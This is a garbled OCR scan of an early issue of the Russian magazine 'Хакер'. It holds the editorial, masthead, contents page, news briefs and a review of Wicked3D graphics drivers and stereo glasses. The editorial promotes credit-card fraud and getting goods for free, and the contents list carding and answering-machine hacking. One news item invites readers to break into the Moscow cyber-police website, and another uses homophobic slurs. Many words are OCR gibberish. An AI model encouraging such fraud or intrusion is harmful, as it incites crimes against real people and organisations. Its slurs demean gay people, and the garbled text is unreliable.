і>;дмгѵые*.' 




- Ты чё, 

) баклан, 
не понял? Мы, 
| типа, крутые 

I ВЗЛОІ5ЩУКУ і 







Хакеры, крякеры, варезники, фрикиры, кибер-панки... 
Каждый, кто вошел в Сеть и побыл там пару месяцев, 
постепенно начинает искать сайты о хакерстве, а после 
того как накачал себе штук 20 разных программок, уже 
считает себя кул-хацкером и готовится к будущим подви- 
гам. Все подвиги обычно заканчиваются нюканьем в ІКС 
или генерацией номеров кредиток для входа на порно- 
сервер. Давай-ка, приятель, наконец-то признаемся чес- 
тно. Ну, какие мы хакеры, ко всем чертям? Ты и я — обыч- 
ные пользователи Сети, которые интересуются хакер- 
ством. 

Многие считают хакеров эдакими полулюдьми-полуро- 
ботами, эдакими отмороженными компьютерщиками, ко- 
торые дни и ночи проводят перед монитором, постоянно 
что-то взламывая. Дерьмо какое! Хакер — прежде всего, 
человек. Он, как и ты, тоже играет в компьютерные игры, 
тоже ползает по Интернету, тоже читает книги, тоже 
встречается с девочками и пива пьет не меньше тебя. По- 
верь мне, приятель, ОНИ — такие же, как и ты. Един- 
ственное, чем они отличаются — это тем, что они знают 
немного больше тебя. Они интересуются всякими зануд- 
ными для тебя вещами, типа «Особенности протоколов 
ТСР/ІР и ІЮР» или «Основные характеристики серверов 
на базе операционной системы ІІпіх». Да, это скучно, да, 
это узко специализировано, но настоящий хакер обо- 
жает познавать. Он ищет информацию, он поглощает ее. 
Но, самое главное, хакерство — это не занятие, это стиль 
жизни. Хакнуть можно все, что угодно. Далеко не только 
сервер в Интернете. Но заниматься только хакерством 
тоже противопоказано. Нужно все-таки и жить, причем, 
весело получая удовольствие от всего. Создавая наш 
журнал, мы рассчитывали, прежде всего, на нормальных 
людей. На людей, для которых компьютер — любимая иг- 
рушка. Как для автолюбителя — его машина. Мы пони- 
маем, что любой хакер интересуется не только самим ха- 
керством, но и всеми остальными прелестями жизни. 
Поэтому будем рассказывать тебе и об играх, и о желе- 
зе, и о самом хакерстве, и об Интернете, да, в принципе, 
обо всем, чем ты интересуешься. Мы будем стараться да- 
вать тебе как можно более свежую информацию. Хотя, 
признаться честно, нам больше нравятся всякие нестан- 
дартные вещи. Все то, что не печатается в других журна- 
лах. Поэтому мы делаем рубрику отстойных игр, таких, от 
которых тебя стошнит на экран. Мы отыскиваем всякие 
дикие сайты в Интернете, чтобы рассказать тебе о них в 
обзоре ѴѴѴѴѴѴ. Мы рассказываем тебе, как ломаются 
кредитки или как получать товары в магазине на халяву. 
Вообще, халява — это наше слово. Мы ненавидим сидеть 
за какой-нибудь игрушкой часами, тупо пробиваясь че- 
рез один и тот же уровень. Мы используем всякие коды и 
креки, чему и тебя учим. Мы ненавидим платить. Поэтому 
мы находим разнообразные способы, чтобы получить то- 
вар или информацию на халяву. И об этом тоже расска- 
зываем тебе. Мы не любим скучать, а кислая рожа выво- 
дит нас из себя. И поэтому мы постоянно шутим и изде- 
ваемся надо всеми подряд. 

В общем, если ты чувствуешь, что все эти качества 
присущи и тебе, то это значит, что «мы с тобой одной 
крови». 

Сергей Покровский ака ЗІЫіеі, 

Редактор X. 



редАКция 

Игорь Пискунов ідог@датеІапё.ги 
Сергей Покровский рокгоѵ5ку@хакер. ги 
Денис Давыдов бекаабг@датеІапё. ги 



АРТ 

Владислав Пискунов ѵІаё@датеІапё.ги 
Кирилл Горячев сдог@датеІапсі.ги 



концепция 
редактор 
редактор раздела игр 



арт-директор 
дизайн и верстка 



производство 

Леонид Андруцкий Іеопіё@датеІапё.ш фотовывод 

Борис Скворцов ЬогШдатеіапё. ги обслуживание компьютеров 

Ерванд Мовсисян техническая поддержка 



РЕКЛАМНЫЕ! ОТДЕЛ 

Игорь Пискунов ідог@датеІапё.ги руководитель отдела 

тел.: (095) 797-1489, 1244)402; факс: (095) 125-0211 



ОТДЕЛ РАСПРОСТРАНЕНиЯ 

Владимир Смирнов ѵІаёітіг@датеІапё.ги 
Самвел Анташян 5 атѵеІ@датеІапё.ги 

тел.: (095) 124-0402; факс: (095) 125-0211 



6АМЕ1АЫР РЦВЦБНіМЕі 

ИЧП «АГАРѴН Компани» учредитель и издатель 

Дмитрий Агарунов ётИгШдатеІапё. ги директор 

Владислав Пискунов ѵІаёѲдатеІапё.гц администратор 

Юрий Королев уигЩатеІапё.ги финансовый директор 



Для писем 101000, Москва, Главпочтамт а/я 652, ХАКЕР 
ѴѴеЬ-5і*е НПрУАл/ѵѵѵѵ.хакер.ги 
Е-таі1 тадагіпе@хакер.ги 

Вывод на пленки осуществлен «ХГС» \ 

Отпечатано с готовых диапозитивов в типографии «Московская Правда 
Зарегистрирован в Государственном Комитете РФ по печати. № 0182*^ 

Тираж 20 000 экземпляров 
Цена договорная 

X З.о>0б 

приглашает авторов и редакторов. 

Минимальные требования: знание аппаратных средств, прог- 
раммного обеспечения, компьютерных игр и т.д. Умение 
складывать из букв слова, а из слов предложения. 
Рекомендуемые требования: знание аппаратных средств, 
программного обеспечения, компьютерных игр и т.д. Опыт 
работы в компьютерных журналах или ведение \Л/еЬ-сайтов. 

Работая в Хакере, вы сможете реализовать все собственные 
амбиции и стать знаменитым. 

Мы не жадные и платим хорошие деньги за работу. 
Информацию о себе направляйте Игорю Пискунову: 

Е-таіІ: ідог@датеІапс!.ги Факс: 125-021 1, Тел.: 124-0402 




С 1 -го марта вы можете получать журналы 
Страна Игр, Хакер и РІау$1а1іоп с бесплатной 
доставкой на дом в удобное для вас время, 
сделав заказ по телефонам: 

284-56-04, 280-34-72, 280-80-64, 280-92-47 



Атеисту требуются курьеры на постоят 
Звоните по телефону 284-56-0 



г 




46 І.е* і* ВІеесИ 

Благая весть о 
скором пришест- 
вии Огюке 3 Агепа. 



Старший опер 
ѲоЫіп 



скидка і 
получен 
кредиты 
карт 



Кардинг... К 
много в этом сл 
/ ве для серді 
кого слило< 
Как много в ж 
отозвалось! ,□ 
да, да, друз 
мои. Именно ка 
дингом мы сегс 
ня и займем< 




У2К: Мц$* Оіе или нет? 



Х:/суЬег/пеѵ/5 

6 Новости 

Регпіт 

8 Придай ОБЪЕМ! Моделируй 
свои ощущуения в собственном стиле! 

РС Іопе 

13 Теперь ты будешь апгрейдиться 
на халяву. 

16 Советы начинающему 
биохакеру. 

20 У2К: Мызі Иіе или нет? 



Взлом 

23 Узнай, кто еще звонит твоей 
подружке. Как взломать автоответчик. 

24 100% скидка на получение 
кредитной карты. 

27 Немного о Хотмейловском 
мыле... 

Х:/пеѵѵ5/дате5 

28 Игровые новости 

Тема 

34 Патчи 

36 А был ли мальчик? 

Жанровая неопределенность в жанре 
СЕРО. 

Параллельный порт 

40 Хакеры: кто они? Достоверная 
история хакерства на Руси и в 
Закордонии. 

Лицом к лицу 

44 Кто такой Джон Ромеро? 

46 До выяснения... 

70 Приговор 
88 Крематорий 



Когда Билли, анонсируя ѴѴіпсІом/5 98, уверял, что 
эта операционная система уже подготовлена к 
проблеме Ѵ2К, эксперты только рассмеялись — еще 
бы, ведь система стала зваться именно ѴѴіпсІом/5 

98, а не ѴѴіпсІоѵѵз 1 998... 



( 004 | 



Грубый ШИКЕЛЬ 



92 

94 

96 

98 



ѴѴогІсІ ѴѴіІсі ѴѴеЬ 

Халява 

Р.А.О. 

Хумор 



У 






70 Сі*у 3000 

Тебя похоронят под слоем мусора. 



23 Узнай, кто еще звонит твоей 

подружке. 

Как взломать автоответчик. 

Сергей ПОКРОВСКИЙ 



86 АрасНе Наѵос 

Скажи мне, кто тебя 
сделал, и я скажу тебе, 
кто ты. 



ЧЯшая® 



/ 

Игры в номере 

До выяснения... 

46 Оиаке 3 Агепа 
52 ТіЬегіап 5ілі 

55 Еѵеп$1аг 

56 Сгеесі 

58 МеТаІ Раіідие 

61 ЗіагТгек: Ыеж ѴѴогІсЬ 

62 НаЫ2 

64 Рапхег ЕІИ-е 
66 ВіоТесН: ЫЬегаТог 
66 ВІоосІ 2: РеЬеІаНопз 

66 Оекоп 

67 іеН Согсіоп Х5 Касіпд 

67 ОІутрде: ѴѴаг о* ТНе СосІ$ 

67 РІавІіс АпдеІ 

68 $Нодип: ТоТаІ ѴУаг 
68 ЗиЬтагіпе Тііапз 

68 ТНе КеаІ ЫеѵегепсГіпд 51-огу 

69 Тхаг: Вигсіеп О* ТИе Сгоѵѵ.. 
69 Ѵатріге: ТИе Мазяііегасіе 
69 ѴѴІМ 



Арсений Иванов 



8 Придай 
ОБЪЕМ! 

Моделируй свои 
ощущуения в 
собственном 
стиле! 

Константин 
МАРТЫНЕНКО 




Приговор 
70 $ітСііу 3000 
76 Ваісіиг'з баіе 
79 МуіН 2: БоЫЫідНіег 
82 Сагпіѵогез 
84 СІиезі Рог ОІогу V 
86 АрасНе 



Крематорий 
^88 Цргшпд 2 




Х:/суЬег/пеѵз 



Кибер-полиция 
добралась и до 
России-матушки. 



новости 



Открыли на средства УЭП ГУВД 
Москвы сайт ѵ/ѵѵѵѵ.суЬегроІісе.ш. С 
дебильным дизайном и с не менее 
тупым содержанием. Они (в смысле 
сайт) — это «Подразделение по 
выявлению и пресечению преступ- 
лений, совершаемых с использова- 
нием поддельных кредитных карт, и 
преступлений, совершаемых путем 
несанкционированного доступа в 
компьютерные сети и базы данных». 

А чем занимаются — прыгают от 
восторга, что почти засадили 1 7-ти 
летнего ламера за то, что тот спер 
какие-то жалкие 1 1 штук баксов у 
буржуев. Спер, как последний лох, 
кредитке. Этого «героя» нарекли 
крутым хацкером и с криками хоп- 
хей-ла-ла-лэй дали 5 лет, к счастью, 
условно. Просто пинцет. Да, эти ре- 
бята нам спуску не дадут. Чует мое 
сердце. Найдется добрая душа и 
разнесет весь их сайтик к чертовой 
матери. Сам сайт, как показал не- 
большой анализ, зарегистрирован 
с помощью ПТТ-Телепорт, и там же 
хостится, так что с кряками проб- 
лем больших не будет. Кто первый, 
господа умельцы? А, вообще, сайт 
должен способствовать умиротво- 
рению жителей Сети. Настраивать 
их на лояльность к закону и, вооб- 
ще, помогать осознавать, что крас- 
ть — нехорошо. Ну, вот поживем и 
увидим, кто окажется круче, эти по- 
казушники из УЭП, которые таким 
^оазом оправдывают своё сущес- 
,вание перед народом, а глав- 
ное — перед начальством, или все 
же русский «настоящий» хакер, или 
кракер Ваня. 

^ Ты никогда не боял-^ 
ся, находясь в чате, 
что над тобой совер- 
шат «эмоциональное 
насилие»? 

Да ты даже не знаешь, что это 
такое! А в «загнивающих» Штатах 
сегодня придают очень большое 
значение проблеме «сетевого тре- 



па», опасаясь, что их изнеженные 
детки познакомятся в чате с прос- 
вещенным в компьютерах манья- 
ком, и тот сделает что-то нехоро- 
шее с их чадом. Главное, что пре- 
цеденты есть. Совсем недавно 
только очень эффективные действия 
полиции позволили вернуть домой 
17-ти летнюю жительницу Калифор- 
нии, сбежавшую из дома, поддав- 
шись на «позыв из чата». Вообще, 
сегодня этот феномен заставляет 
ломать голову многих ученых. Как 
преступник уговорил девушку прие- 
хать к нему в Нью-Джерси, девуш- 
ку, живущую в Сан-Франциско? А 
как все хорошо начиналось: милое 
знакомство в чате, треп в уединен- 
ной комнатке, инструкции, как 
уничтожить информацию на жес- 
тком диске компьютера после столь 
приватных бесед. Но нет. Нашли 
голубчика. Не фиг трахаться через 
Сеть. Так и залететь не долго. Рас- 
следование еще продолжается, но 
уже сейчас ясно, что это была не 
единственная жертва маньяка. 
Американская пресса в шоке, но, 
как известно, что русскому хоро- 
шо, то американцу смерть. Однако 
свобода есть свобода. Каждый во- 
лен разговаривать с кем угодно и 
когда угодно. И это правильно. Эх, 
нам бы их проблемы. 



Разработан новый 
алгоритм шифрации. 

Но есть и кое-что полезное в 
этой Сети. Полезное во всех отно- 
шениях. Электронная торговля. Од- 
но но, очень уж не совершенен ме- 
ханизм платежей. Однако дело 
поправимо, утверждает шестнадца- 
тилетняя ирландская школьница 
Сара Флэннери. Девушка изобре- 
ла новый алгоритм для шифрации 
сообщений, передаваемых через 
Іпіегпе*. Новый код в 10 раз быс- 
трее предыдущего, изобретенного 
более 20 лет назад, в 1 977 году, 
студентами Массачусетского техно- 
логического института и до сих пор 
применяемого как средство защиты 
данных, передаваемых по электрон- 
ной почте. 



Россия родина 
нов, а Норв 
имеет все шан 
стать родиной ха 




Причем именно тех, для которых 
хак — цель и смысл жизни. Верхов- 
ный суд этой страны постановил, 
что попытка вторжения в компью- 
терную систему по Іпіегпеі не яв- 
ляется преступлением до тех пор, 
пока не завершится успехом. Си- 
туация такова: ты что-то ломаешь, 
ломаешь до тех пор, пока не сло- 
маешь совсем, и тебя тогда можно 
наказать. Или — только до того 
момента, когда почти сломал, и 
плодами твоей напряженной, но 
«безопасной» работы может вос- 
пользоваться другой член команды 
и докончить дело. Теперь оборона 
превращается в личное дело каж- 
дого, каждый сам несет ответ- 
ственность за то, что он лох и поз- 
волил другим влезть в свою систе- 
му. Критики этого постановления 
утверждают, что с тем же успехом 
можно разрешить грабителям про- 
верять, заперты ли в доме окна и 
двери, и не применять меры пресе- 
чения до тех пор, пока они на са- 
мом деле не вломятся в жилище. 
Ноодноделореал ы н ы и мир, а 
другое — СуЬегЗрасе. Как говорят 
у нас в Одессе — «это две боль- 
шие разницы». 



'Идеи интеллектуалъ-^ 
ного дома, типа тако- 
го, в котором отви- 
сает сейчас великий и 
ужасный ВіІІ баіез, 
живут и побеждают. 

Как известно, в весьма обозри- 
мом будущем нас ждет цифровой 
рай, в котором каждой микровол- 
новке или кофеварке будет дан 
постоянный ІР-адрес. Т.е. будем го- 
товить, не отрывая задницы от сту- 
ла. Там, глядишь, они еще и летать 
или, на худой конец, ездить станут. 
Вообще из-за компьютера не вы- 
беремся. Компания Затзипд реши- 
ла не ждать «прекрасного далека» 
и скоро запускает в серию первую 
интеллектуальную микроволновую 
печь с подключением к ІпіегпеТ 
Буржуи оборзели до того, что 
встроили в печь считыватель штри- 



006 ) 



хового кода, что дает возможность 
настраивать уровень температуры 
приготовления и время — в зависи- 
мости от производителя пищевого 
продукта. Или печь сама связы- 
вается с ѴѴеЬ-сайтом производите- 
ля для определения оптимального 
времени приготовления блюда. 
Единственное, что пока точно не 
ясно: что делать, если коннект мед- 
ленный, и не сгорит ли блюдо или 
не разнесет ли из-за этого саму 
печку ко всем чертям. 



Теперь можно узнать, 
где живут педофилы. 

Безумные техасцы из города Ос- 
тин дошли до того, что организова- 
ли специальную службу, позволяю- 
щую родителям определить, опи- 
раясь на данные полиции, живет ли 
в их округе какой-то маньяк, псих, 
педофил и иже с ними. За умерен- 
ную плату в 3,15 доллара можно 
искать подобных извращенцев на 
сайте по адресу 

ЬіІр://гесогсІ5.Ъ(сІр$.$ІаІе.Іх.и$/сІр$/. 

Причем поиск ты можешь задавать 
как по имени улицы, так и по 2ір-ко- 
ду (нечто вроде нашего индекса). 
Очень заманчиво, особенно если 
детишки вдруг захотят острых ощу- 
щений. Как бы эти ощущения не 
стали в прямом смысле острыми, 
как ножички, которые очень ува- 
жают разные извращенцы. 



то, напоминающее {ыск.гіі (по оби- 
лию мата и экстремальных текстов), 
.только все о заднице. 



Кукла Ферби призна- 
на шпионом. 

В продолжение новости о кукле 
Ферби (кто не в курсах — это самая 
модная игрушка 98 года). Газета 
ѴѴазЬіпдіоп Розі сообщила о том, 
что Агентство национальной безо- 
пасности (АНБ) США запретило в 
декабре появление популярных иг- 
рушек Ферби в закрытом городе 
Форт-Мид из-за способности этих 
кукол повторять «услышанное». 
Вообще, в список запрещенных к 
ввозу в город предметов входят 
личная фотоаппаратура, видео- и 
звукозаписывающие устройства. 

Вот так. Угроза национальной бе- 
зопасности. Куколка стоимостью 30 
долл, наделала изрядный перепо- 
лох. Ведь Ферби могут не только 
реагировать на окружающее, пов- 
торяя услышанные звуки, но и 
спать, общаться друг с другом и да- 
же разговаривать на собственном 
особом языке. Чем не средство для 
шпионажа??? 



Сгеаііѵе бгарЬісз 
ВІазІег Кіѵа ТЫТ самая 
а оптимальная покуп- 
ка года. 



«От винта», — кричал 
Карлсон, отбиваясь 
от гомосеков. 



«От винта» впору кричать и нам, 
поскольку от голубых житья нет уже 
нигде. Весьма активно действует 
сайт ѵлѵѵ/.дау.ш, где ѵѵеісоте всем 
голубым, лесбиянкам, транссексуа- 
лам. Но эти ребята решили не ос- 
танавливаться на достигнутом, и от- 
крыли новый сайт — Пидор Онлайн 
(ѵѵмлллрібог.сот), где громогласно 
заявляют, что они «не какие-нибудь 
там гении», а намного круче. Ус- 
траивают полный экстрим с рубри- 
ками «Лучший пидор России», «Как 
я и как меня...» и даже ведут РАО 
по траханью в жопу!!! Охренеть, до 
чего дошло! Хотя, с другой стороны, 
это лучше, чем всякие там сраные 
манерности, как на гей.ру. Здесь 
хоть поприкалываться можно. Неч- 



Видимо в прошедшем году са- 
мой актуальной была проблема 
надрать кому-нибудь задницу в Ква- 
ке или любом другом ЗО-шутере, 
так как этот год оказался особо 
урожайным на 30-ускорители. На 
рынок было выброшено немало но- 
винок — Ѵообоо ВапзЬее от 30\х, 
Ріѵа ТЫТ от ЫѴісІіа, Маігох Ѳ200. 
Самой «горячей» и самой покупае- 
мой новинкой стали видеоплаты на 
чипе Ріѵа ТЫТ. Великолепная произ- 
водительность в 20 графике, плюс 
30 акселерация сделали карты на 
основе этого чипа самыми желан- 
ными подарками на Новый год и 
Рождество. А один из популярней- 
ших российских сайтов Реасіог 
СгіІісаІ (ѵ/\ѵ\ѵ.геасіог.ш) назвал кар- 
ту Сгеаііѵе СгарЬісз ВІазіег Ріѵа 
ТЫТ самой оптимальной покупкой 
года по критерию цена/качес- 
тво/скорость. По данным того же 
Реасіог СгіНсаІ, самыми покупаемы- 



V 



У 



Х:/су Ьег /пе ѵз 



ми ЗЭ-ускорителями в Москве ста- 
ли Сгеаііѵе СгарЬісз ВІазіег ТЫТ и 
ОіатопсІ Мопзіег 30 II на основе 
ЗОЫ Ѵообоо II. 



Статья 1999, УК: Ха- 
керство — от пожиз- 
ненного цика с гвоз- 
дями до расстрела. 

Двое китайских хакеров — быв- 
ший бухгалтер шенчженьского от- 
деления Индустриального и ком- 
мерческого банка Китая Хао Джин- 
глонг (Нао Лпдіопд) и его брат Хао 
Джингвена (Нао Лпдѵѵеп) поплати- 
лись жизнями за свое незаконное 
ремесло. Эти парни совершили ба- 
нальный грабеж банка, стибрив 
всего 260 тыс. юаней (31 400 дол., 
По сравнению с украденным из 
СііуВапк'а, это сущая мелочь, так, 
на сникерсы и презервативы. Это 
вам не широкая русская душа. 
Впрочем, другая страна, другие 
масштабы. Социалистический суд 
сумел вернуть деньги, но все рав- 
но впаял обоим «вышку». Вот так- 
то. Слава Богу, что мы живем не в 
Китае... 




Новый Год — ужас 
для провайдера. 



В России есть две проблемы — 
дороги и дураки, которые их строят. 
В Сети такая же бодяга. В предрож- 
дественские дни из-за увеличивше- 
гося почти в 30 раз (в среднем до 
Мб) размера сообщений за 
счет вложенных файлов — 
всяких там открыток с кошеч- 
ками, цветочками и обкурен- 
ными Дедами Морозами — 
системы провайдеров нае- 
лись кексов капитально. Ани- 
мационные поздравительные 
открытки забили каналы свя- 
зи, почта шла 5-7 часов 
вместо обычных 5-15 минут. 

Вот это я и называю спамом. 

Самым официальным и за- 
конным спамом года. 



Андрей Князев. 



Х:/пеѵз/сотриІс.ег 



« 





Вот тебе, приятель, и подарочек на Новый год от 
компании МеіаЬуІе, которая до сих пор была прак- 
тически неизвестна российскому покупателю. А ведь 
МеіаЬуІе делает такие крутые вещи, как: 

Ілата Ѵ/іскеб 30 на основе Ѵоосіоо 2 

- Плата Ѵепдеапсе на основе ВапзЬее 

- Стереоочки еуеЗСКЕАМ 



Что, никогда не слышал о таком? Ну, да это и не 
удивительно. Хотя, к моменту выхода «X», 
эти три продукта уже должны появиться 
в продаже, по крайней мере, в Мос- 
кве. Я расскажу тебе сразу про все 
три, так как они имеют под собой 
единую программную основу. 

Компания МеіаЬуІе специализи- 
руется на разработке программно- 
го обеспечения и консалтинге в этой 
области. Подразделение ѴѴіскесІ ЗЭ 
же делает основной упор на ПО — драйвера для ви- 
деоплат и очков. Для неискушенного юзера платы 
МеіаЬуІе покажутся геЬгепсе-платами от ЗйЬс. За что же 
платить деньги? А вот есть за что. За технологии, разрабо- 
танные МеіаЬуіе, за самые лучшие в мире драйверы, за 
^мую грандиозную попытку добавить настоящее третье 
мерение. Обо всем этом я постараюсь рассказать как 
можно полнее и нагляднее. 

МеІаЬуіе вошла на рынок графических ускорителей 
достаточно давно. Первые видеоплаты серии Оіа на осно- 
ве Тгіо64 и Ѵігде сразу привлекли внимание технологией 
КеРІех. Первой платой серии ѴѴіскесІ Зй стал ЗР-ускори- 
тель на основе чипа ѴѴагр 5. ѴѴагр 5 нес в себе много ре- 
волюционных черт, но, к сожалению, разработчик чипа - 
компания Оак ТесЬпоІоду - объявила об уходе с рынка 
графических чипов буквально сразу же после начала про- 
даж плат ѴѴіскесІ Зй. После этого Ме+аЬуІе переключился 
на Ѵоосіоо 2, а затем на ВапзЬее. 



Вообще-то настройки драйвера довольно обширны. Запом- 
нить с первого раза, что где находится просто невозможно. На 
закладке ѴѴіскесІ 30 в СопІгоІ РапеІ доступны все разделы: 
Ре2РІех (разрешения и частоты развертки), РігѳсКЮ, ОІісІе, 
ОрепСІ., ѴѴіскесІѴізіоп (настройка стереоочков), АсіѵапсесІ (раз- 
гон), Сатгпа (гамма-коррекция). Но давай по порядку. 



Ре2РІех — сердце драйвера, технология, даю- 
щая возможность установить любое разрешение и любую час- 
тоту развертки, которые позволяет чипсет. Разрешение - от 
320x200 до 1 024x672 для одной платы Ѵоосіоо 2 (до 1 024x1 024 
для БЫ). Разрешение может быть любым с точностью до пиксе- 
ла, причем, азресі гаКо (соотношение сторон) пиксела тоже мо- 
жет быть любым. Частоту развертки можно установить с точ- 
ностью до герца. Кнопочка «Тезі Мобе» позволяет проверить 
работоспособность монитора с нестандартными развертками. 
Для удобства разрешение меняется обычным бегунком. Нас- 
тройки запоминают разрешения, между которыми и бегает этот 
бегунок. Было бы неудобно при частой смене разрешения каж- 
дый раз вводить его ширину и высоту с помощью клавиатуры. 
Список разрешений можно дополнять или сокращать в диало- 
говом окне Сцзіот 



ОігесіЭО 



- ВеЯТех 
Ве«4и6огс 



1024 Ьу 1024 риек 
ВеЛе$Ь В<*е: 



[б8Нг 



КезоЫіоп СопігоІ Сепіег. 
Любому разрешению мож- 
но назначить атрибут 
«Зсапііпе РоиЫіпд», о ко- 
тором пойдет речь ниже. 
Ре2РІех работает в 
ОігесКЗИ, ОрепОІ. и ОІісІе. 
Прежде всего, Ре2РІех ин- 
тересен возможностью ис- 
пользовать высокие разре- 
шения, недоступные другим 




ІСизІош ВезоІіЛіоп Сопіюі Сспісі 



№№030 



(при 0 елей ЯеюкАоп 
ѴЛЛк |1024 
Н«д* (672 ^ 

Айѵ-апсесі ВеюІиЬоп Ор^югк 
Р/ $с-ап*пе ОоиЬЬпд 
Г~ ІШегіасесІ 



512 Ьу 384 рсевк. ІбЬрр 
640 Ьу 400 реееі$. ІбЬрр 
640 Ьу 480 р*ек. ІбЬрр 
800 Ьу 600 ресеЬ. ІБЬр 



Ѵоосіоо 2-платам. На 
обычной Ѵоосіоо 2- 
плате нельзя поставить 
разрешение выше 
800x600. На плате 
ѴѴіскеб ЗЭ с помощью 
Ре2Р1ех можно поста- 
вить более высокое 
разрешение - до 
1024x672. При этом, 
конечно, скорость упа- 
дет. Но если, к приме- 
ру, какая-либо игра на 
Ѵоосіоо 2 дает 60 {рз в 
разрешении 800x600, 
то грех не воспользо- 
ваться Ре2РІех и не иг- 
рать на скорости 40 ірз при более высоком разрешении. Нас- 
колько сильно падает скорость при переключении с 800x600 на 
1024x762? Простые расчеты показывают, что разрешение 
1024x672 вмещает в 1,43 раза больше пикселов, чем 800x600. 

В НІгаіе-ограниченной игре мы склонны ожидать падение ско- 
рости максимум в 1 ,43 раза. Однако на практике скорость сни- 
жается более чем в 1 ,6 раза, то есть скорость падает нелиней- 
но - это связано с архитектурными особенностями Ѵоосіоо 2. 



3 




Максимум для ѴѴіскеб ЗЭ 5Ы - 1 024x1 024 содержит на треть 
больше пикселов, чем максимум для обычных Ѵоосіоо 2 в конфи- 
гурации $І_І - 1 024x768. Скорость падает также на треть. 



Форсирование разрешения (Резоіцііоп Оѵеггісіе) 



Правильные игры спрашивают у драйвера, какие разреше- 
ния он поддерживает, и предлагают пользователю выбор. Неп- 
равильные игры считают себя умнее всех и зачастую полагают, 
что выше какого-то разрешения, например 800x600, пока не 
ступала нога человека. Для таких неправильных игр предназна- 
чена функция Форсирование разрешения. 

К примеру, ты хочешь играть в Сагтадесісіоп II в разреше- 
нии 1024x1024. Включаешь опцию Рогсе ѵібео тобе, выстав- 
ляешь разрешение 1024x1024, а в разделе Ноі Кеуз (горячие 
клавиши) назначаешь функции Резоіііііоп Оѵеггісіе комбинацию 
клавиш (к примеру, СігІ-О). После этого запускаешь игру, жмешь 
ОН-О, и игра переключается в разрешение 1024x1024. Сказка. 
Правда, то, что все горячие клавиши настраиваются в разделе 

ѴѴіскесІѴізіоп, я считаю не 
очень интуитивным. Но 
можно обойтись даже без 
использования горячих кла- 
виш. Достаточно поставить 
! флажок Эе{аЫ* гезоМіоп 
оѵеггісіе. В этом случае 
драйвер включит разреше- 
ние 1024x1024 сразу после 
запуска игры. 



Ѵйео Мойе ЗеІесЬоп 

гтюйе теіесйоп іп дате 
Рексе 5в(ес(есІ ѵйео тойе 

Ѵкіео Мойе: 

ІАМ 



1024 Ьу 1024 росек 

ТЬв $ейпд сап Ье $ѵ4сЬей Іа*е» Атпд (Ье дате. 

I” іезокЛюп сѵетсіе Оп 





— 




Эта функция не работает на БЫ, а только на одной Ѵоосіоо 2-пла- 
те. Смысл следующий. 

Какой недостаток имеют большие мониторы — 1 7"- 21"? На 
них неприятно работать в низких разрешениях (640x480, 

800x600). Это особенно критично, когда речь идет о Ѵоосіоо 2, 
ведь это основные для нее разрешения. На большом мониторе го- 
раздо больше точек люминофора, чем на маленьком, и поэтому в 
низком разрешении он не успевает весь подсвечиваться. Возни- 
кают межстрочные темные интервалы. Для наглядности взгляните 
на картинки. 

ѴѴіскеб ЗЭ эффективно борется с этой проблемой с помощью 
Удвоения сканлайнов. Все просто — каждый сканлайн подается 
на монитор дважды. Фактически ты видишь на мониторе не 
800x600, а 800x1200. Темные интервалы пропадают полностью, а 
на скорости это никак не сказывается, так как удвоение сканлай- 
нов — аппаратная функция. Единственное, что надо учитывать - 
удвоение ріхеі сіоск, а он должен влезать в ВАМЭАС. 




ѴѴіскесІѴізіоп 



ѴѴіскесІѴізіоп — технология, позволяющая запускать любые 
трехмерные игры в стерео. Разумеется, технология может быть ис- 
пользована только со стереоочками. Вот для этого и нужен 
еуеЗСРЕАМ — продукт, включающий стереоочки, конвертер ви- 
деосигнала, передатчик и драйверы. Сейчас в составе 
еуеЗСКЕАМ идут очки компании НЗЭ, в ближайшем времени 
МеІаЬуіе планирует перейти на другую модель. 

Купив еуеЗСРЕАМ, ты можешь подключить их к любой Ѵоосіоо 
2-плате или к Ѵепдеапсе на ВапзЬее. Также есть версия 
еуеЗСКЕАМ для любых ВапзЬее-плат. Другими словами, любой ва- 
риант еуеЗСРЕАМ можно подключить к видеоплате от Ме*аЬуІе, 
но если у тебя Ѵоосіоо 2 или ВапзНее от другого производителя, 
при покупке стереоочков выясни - для какого чипсета он поедн(рз- 
начен. 













інцип действия стереоочкоі 



Немного о физиологии 

Ты можешь спроситъ : «Зачем все это нужно? Ведь в ()иаке 
2 и так все трехмерно». Но проекция трехмерного мира на 
экран не дает полного ощущения трехмерности. То , что ты 
видишь на экране — это , примерно , то, что ты видишь, закрыв 
рукой один глаз. По одной картинке мозг человека не может оп- 
ределить точное расстояние до объекта, если оно не может 
определяться косвенно, к примеру, по размерам объекта. 

«Вранье, я и с одним глазом вижу то же самое,» — ска- 
жешь ты. Но это не так. Для того чтобы убедиться в этом, 
достаточно продеіать следующий трюк. Вытяни перед собой 
руки, так чтобы тыльные стороны ладоней были обращены на 
тебя. Теперь приблизь одну руку немного к себе и закрой глаз. 

Так как размеры ладоней будут одинаковы, то, при отсутствии 
теней, тебе будет сложно визуально опредеіить, какая ладонь 
ближе. Как только откроешь второй глаз, ты моментально 
определишь это. Двигая ладонь взад-вперед при закрытом глазе 
и периодически открывая-закрывая его, можно почувствовать 
глубину. 

В настройках драйвера есть тест, который рисует квадра- 
ты, находящиеся на разном расстоянии от наблюдатеія. Раз- 
меры квадратов подобраны таким образом, чтобы их проекции 
на экран имеіи одинаковые размеры. Надев стереоочки, ты мо- 
жешь опредеіить, какой квадрат находится ближе, а какой 
дальше. Ситуация изображена на рисунке, хотя я изобразил не 
квадраты, а кружки. На верхнем рисунке большой кружок на 
расстоянии 25 см от наблюдатеія проецируется на красную 
плоскость, и его проекция выглядит маленькой. На нижнем ри- 



Стереоочки дают геймеру ощущение глубины в ЗЭ-иг- 
рах, истинные три измерения. Сравнивать 30-игру в сте- 
реоочках и без них — все равно что сравнивать стерео- и 
монозвук. Если первые стереоочки пятилетней давности да- 
вали лишь жалкий эффект глубины с помощью трюков, свя- 
занных с физиологией человека, то сегодня речь идет об 
истинной стереоскопии, когда на правый и левый глаз по- 
даются разные картинки. 

Принцип действия широко известен и 
не является исключительным для ИЗО. 

Монитор выдает чередующиеся кар- 
тинки для левого и правого глаза, с 
помощью передатчика или кабеля 
сигнал синхронизируется с очками, 
а очки поочередно закрывают ле- 
вый и правый глаз жидкокристалли- 
ческими створками. НЗЭ использует 
инфракрасный передатчик. 

Создание стереоизображения 
требует минимум вдвое большей рабо- 
ты для ЗЭ-ускорителя. Способ получения сте- 
реоизображения на экране монитора можно раз- 
делить на этапы: 



1 . Игра, которая ничего не знает о стереоочках, рабо- 
тает совершенно обычным образом. 

